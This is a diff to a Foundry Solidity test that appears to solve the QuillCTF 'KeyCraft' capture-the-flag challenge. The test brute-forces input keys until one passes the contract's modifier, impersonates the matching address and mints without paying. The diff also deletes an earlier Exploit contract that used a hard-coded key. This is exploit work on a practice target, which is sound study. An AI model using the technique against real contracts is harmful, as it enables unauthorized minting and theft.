@@ -6,42 +6,44 @@ import "../../src/QuillCTF/KeyCraft.sol";
 
 contract KeyCraftTest is Test {
     KeyCraft public keyCraft;
-    Exploit public exploit;
     address public deployer;
+    address public preAttacker;
     address public attacker;
+    uint256 public index;
 
     function setUp() public {
         deployer = vm.addr(1); 
-        attacker = 0x2B82c473333012BC1a239bF59F93b9916cDf7486;
-        console.log("attacker: ", attacker);
-        vm.deal(attacker, 10 ether);
+        preAttacker = vm.addr(2);
+        console.log("preAttacker: ", preAttacker);
+        vm.deal(preAttacker, 10 ether);
 
         vm.startPrank(deployer);
         keyCraft = new KeyCraft("KCNFT", "KC");
         vm.stopPrank();
-
-        // vm.startPrank(attacker);
-        // exploit = new Exploit{value: 1 ether}(keyCraft);
-        // vm.stopPrank();
     }
 
     function testKeyCraftExploit() public {  
+        // Setup
+        vm.startPrank(preAttacker, preAttacker);
+        // keyCraft.mint(abi.encodePacked(uint256(0xf89ae7139a2ecac685ff9161992b9ed1be7ae447883a9b42d533b0f67028298f), uint256(0x2cad20f5d06c1a65b3542e5287da1e2cd7c0fe17aeddd21edf58370c6eb1e07d)));
+        for (uint i = 0; i < 400000; i++) {
+            bytes memory random = bytes(toHexString(i));
+            if (canPassModifier(random)) {
+                index = i;
+                attacker = getAttackerAddress(random);
+                console.log("Attacker: ", getAttackerAddress(random));
+                break;
+            }
+        }
+        vm.stopPrank();
+
+        vm.startPrank(attacker, attacker);
         // Before exploit
         assertEq(keyCraft.balanceOf(attacker), 0);
 
         // Exploit
-        vm.startPrank(attacker, attacker);
-        for (uint i = 0; i < 300000; i++) {
-            console.log("i: ", i);
-            bytes memory random = bytes(toHexString(i));
-            if (canPassModifier(random)) {
-                console.log("attacker: ", attacker);
-                console.log("msg.sender: ", msg.sender);
-                console.log("tx.origin: ", tx.origin);
-                console.log(getAttackerAddress(random));
-                keyCraft.mint(random);
-            }
-        }
+        bytes memory key = bytes(toHexString(index));
+        keyCraft.mint(key);
         vm.stopPrank();
 
         // After exploit
@@ -52,7 +54,6 @@ contract KeyCraftTest is Test {
         uint a = uint160(uint256(keccak256(b)));
         return address(uint160(a));
     }
-
 
     function canPassModifier(bytes memory b) internal pure returns (bool) {
         bool w;
@@ -90,18 +91,4 @@ contract KeyCraftTest is Test {
         }
         revert();
     }
-}
-
-contract Exploit {
-    KeyCraft public keyCraft;
-
-    constructor(KeyCraft _keyCraft) payable {
-        keyCraft = _keyCraft;
-    }
-
-    function attack() public {
-        bytes memory b = hex"f39abb5bcdb5a4e635efe4fd5fdb9a88dc0f91181b1f9bf62d9df35b59ef6cae";
-        keyCraft.mint{value: 1 ether}(b);
-    }
-
 }
